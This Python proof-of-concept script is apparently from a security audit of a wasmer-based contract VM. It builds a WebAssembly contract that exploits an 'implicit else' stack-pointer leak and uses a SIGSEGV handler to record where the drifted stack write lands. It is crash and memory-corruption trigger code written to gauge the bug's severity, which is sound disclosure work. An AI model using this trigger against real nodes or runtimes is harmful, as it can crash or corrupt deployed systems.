#!/usr/bin/env python3
"""
Where exactly does the drifted stack pointer land, and what happens there?

The "implicit else" bug leaks 8 bytes of native stack per execution of a
false `if` with a spilled block parameter.  If the contract makes a call
*after* the leaking loop, the call sequence writes at the (drifted) stack
pointer.  Two things matter for the severity of the finding:

  * where the write lands (inside the wasm stack -> clean trap; outside ->
    wild write into whatever the allocator placed there),
  * whether wasmer can still recover (it can only recover while the stack
    pointer is inside the bounds of the wasm stack).

This script runs the trigger with a SIGSEGV handler installed with
SA_ONSTACK (so it also fires on stack exhaustion) and dumps the faulting
address, the stack pointer and the surrounding mappings.
"""
import ctypes
import os
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                                     # noqa: E402
from wasm_builder import (                              # noqa: E402
    Module, I32, I64, op_i32_const, op_i64_const, op_nop, op_end, op_if,
    op_drop, op_local_get, op_local_set, op_local_tee, op_i32_sub, op_loop,
    op_br_if, op_call, op_i32_store, op_i32_add, op_global_get, op_global_set,
)

SA_SIGINFO = 0x00000004
SA_ONSTACK = 0x08000000
SA_RESTORER = 0x04000000
SIGSEGV = 11
SIGSTKSZ = 1 << 16
RESP_PTR = 16


def build(iterations, ifs_per_iter=1, call_after=False):
    m = Module()
    m.add_memory(4, export="memory")
    t_pass = m.add_type([I64], [I64])
    m.add_data(RESP_PTR, (64).to_bytes(4, "little") + (4).to_bytes(4, "little")
               + (4).to_bytes(4, "little"))
    probe = m.add_func([], [], body=op_nop())
    b = bytearray()
    b += op_i32_const(iterations) + op_local_set(1)
    b += op_loop()
    for _ in range(ifs_per_iter):
        b += op_local_get(0) * 4
        b += op_local_get(0)
        b += op_i32_const(0)
        b += op_if(t_pass) + op_drop() + op_i64_const(42) + op_end()
        b += op_drop() * 5
    if not call_after:
        b += op_call(probe)      # the call is inside the loop
    b += op_local_get(1) + op_i32_const(1) + op_i32_sub() + op_local_tee(1) + op_br_if(0)
    b += op_end()
    if call_after:
        b += op_call(probe)
    fn = m.add_func([], [], locals=[I64, I32], body=bytes(b))
    m.add_func([I32, I32, I32], [I32], body=op_call(fn) + op_i32_const(RESP_PTR),
               export="execute")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(RESP_PTR),
               export="instantiate")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    g_bump = m.add_global(I32, True, op_i32_const(1024))
    g_region = m.add_global(I32, True, op_i32_const(128))
    alloc = (
        op_global_get(g_region) + op_local_set(1)
        + op_local_get(1) + op_global_get(g_bump) + op_i32_store()
        + op_local_get(1) + op_i32_const(4) + op_i32_add() + op_local_get(0) + op_i32_store()
        + op_local_get(1) + op_i32_const(8) + op_i32_add() + op_i32_const(0) + op_i32_store()
        + op_global_get(g_bump) + op_local_get(0) + op_i32_add() + op_global_set(g_bump)
        + op_global_get(g_region) + op_i32_const(12) + op_i32_add() + op_global_set(g_region)
        + op_local_get(1)
    )
    m.add_func([I32], [I32], locals=[I32], body=alloc, export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    return m.build()


def maps():
    out = []
    with open("/proc/self/maps") as fh:
        for line in fh:
            parts = line.split()
            rng = parts[0].split("-")
            out.append((int(rng[0], 16), int(rng[1], 16), line.strip()))
    return out


def run_wasm(wasm, k=1):
    """Runs `wasm` with a SIGSEGV handler that dumps the landing point.

    Returns normally when no fault happens; calls os._exit(42) after the
    dump when the stack pointer leaves the wasm stack.
    """
    base = tempfile.mkdtemp()
    vm = R.VM()
    cache = vm.init_cache(base)
    checksum = vm.store_code(cache, wasm, checked=True)
    vm.instantiate(cache, checksum, 1 << 62)

    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    alt = ctypes.create_string_buffer(SIGSTKSZ * 4)
    ss = R.StackT()
    ss.ss_sp = ctypes.cast(alt, ctypes.c_void_p)
    ss.ss_flags = 0
    ss.ss_size = SIGSTKSZ * 4
    libc.sigaltstack(ctypes.byref(ss), None)

    fired = {"n": 0}

    def handler(sig, info, ctx):
        fired["n"] += 1
        addr = info.contents.si_addr if info else None
        u = ctypes.cast(ctx, ctypes.POINTER(R.UContext)).contents if ctx else None
        rsp = u.uc_mcontext[R.REG_RSP] if u else 0
        rip = u.uc_mcontext[R.REG_RIP] if u else 0
        print("FAULT sig=%d si_code=%d si_addr=%s rsp=%s rip=%s"
              % (sig, info.contents.si_code if info else -1,
                 hex(addr or 0), hex(rsp), hex(rip)))
        ms = maps()
        for lo, hi, line in ms:
            if lo <= rip < hi:
                print("  rip  -> %s" % line)
            if lo <= (addr or 0) < hi:
                print("  addr -> %s" % line)
            if lo <= rsp < hi:
                print("  rsp  -> %s" % line)
        # la pila wasm es la region justo por encima de la pagina de guarda
        # donde se produjo el fallo
        stack_lo = stack_hi = None
        guard = None
        for lo, hi, line in ms:
            if lo <= (addr or 0) < hi and "---p" in line:
                guard = (lo, hi)
        if guard:
            for lo, hi, line in ms:
                if lo == guard[1] and "rw-p" in line:
                    stack_lo, stack_hi = lo, hi
        if stack_lo:
            print("  PILA WASM = [%s, %s) 1 MiB" % (hex(stack_lo), hex(stack_hi)))
            print("  sp - low  = %+d bytes   (sp - high = %+d)"
                  % (rsp - stack_lo, rsp - stack_hi))
            print("  guard page = [%s, %s)" % (hex(guard[0]), hex(guard[1])))
        print("  MAPA COMPLETO:")
        for lo, hi, line in ms:
            sz = hi - lo
            mark = ""
            if sz == 1024 * 1024:
                mark = "   <== PILA WASM 1 MiB"
            print("    %s%s" % (line, mark))
        sys.stdout.flush()
        os._exit(42)

    cb = R.HANDLER(handler)
    global _KEEP
    _KEEP = cb

    class GlibcSigaction(ctypes.Structure):
        _fields_ = [("handler", ctypes.c_void_p), ("mask", ctypes.c_ubyte * 128),
                    ("flags", ctypes.c_int), ("restorer", ctypes.c_void_p)]

    act = GlibcSigaction()
    act.handler = ctypes.cast(cb, ctypes.c_void_p)
    act.flags = SA_SIGINFO | SA_ONSTACK
    libc.sigaction.argtypes = [ctypes.c_int, ctypes.POINTER(GlibcSigaction),
                               ctypes.c_void_p]
    libc.sigaction.restype = ctypes.c_int
    libc.sigaction(SIGSEGV, ctypes.byref(act), None)

    res, rep, err = vm.execute(cache, checksum, 1 << 62)
    print("sin fallo: err=%r" % R.VM._vec_str(err)[:120])


def main():
    iters = int(sys.argv[1]) if len(sys.argv) > 1 else 131072
    k = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    run_wasm(build(iters, k))


if __name__ == "__main__":
    main()
